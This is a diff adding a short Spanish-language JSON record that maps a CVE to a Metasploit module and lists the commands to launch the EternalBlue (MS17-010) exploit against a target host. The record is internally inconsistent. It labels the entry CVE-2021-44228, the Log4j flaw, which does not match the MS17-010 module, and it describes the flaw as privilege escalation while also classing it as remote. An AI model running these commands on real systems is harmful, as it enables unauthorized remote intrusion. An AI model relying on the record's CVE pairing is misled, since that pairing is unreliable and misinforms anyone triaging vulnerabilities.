@@ -1,0 +1,11 @@
+{
+  "cve": "CVE-2021-44228",
+  "modulo_metasploit": "exploit/windows/smb/ms17_010_eternalblue",
+  "descripcion": "Exploit para la vulnerabilidad MS17-010, que permite un ataque de elevación de privilegio en sistemas Windows.",
+  "rango_explotacion": "remoto",
+  "comandos": [
+    "use exploit/windows/smb/ms17_010_eternalblue",
+    "set RHOSTS <target>",
+    "exploit"
+  ]
+}
